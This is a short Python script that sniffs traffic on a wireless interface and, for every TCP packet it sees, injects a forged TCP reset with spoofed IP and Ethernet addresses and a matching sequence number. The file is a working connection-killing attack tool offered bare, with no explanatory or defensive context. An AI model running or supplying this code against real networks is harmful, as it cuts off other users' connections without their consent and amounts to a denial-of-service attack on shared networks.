#! /usr/bin/env python

import os
import socket
import libnet
from libnet.constants import *
os.sys.path.append(os.path.dirname(os.path.abspath('.'))) #fix import path
from sniffer.sniffer import Sniffer

def packet_factory(packet):
    inj = libnet.context(LINK, "wlp3s0")
    srcip = socket.inet_ntoa(inj.get_ipaddr4())
    tcptag = inj.build_tcp(dp=packet['TCP_SPORT'], sp=packet['TCP_DPORT'],
                           control=TH_RST, seq=packet['TCP_ACK_NUM'], ack=packet['TCP_SEQ_NUM']+1)

    iptag = inj.build_ipv4(prot=IPPROTO_TCP, dst=socket.inet_aton(packet['IP_SRC']),
                           src=socket.inet_aton(packet['IP_DST']))

    ethtag = inj.build_ethernet(dst=inj.hex_aton(packet['ETH_SHOST']), src=inj.hex_aton(packet['ETH_DHOST']))
    inj.write()
    del inj
    return

def packet_handle(packet):
    try:
        if packet['IP_PROTO'] == IPPROTO_TCP:
            packet_factory(packet)
    except KeyError: return -1

sniffer = Sniffer()
sniffer.init('wlp3s0')
while True:
    packet_handle(sniffer.sniff())
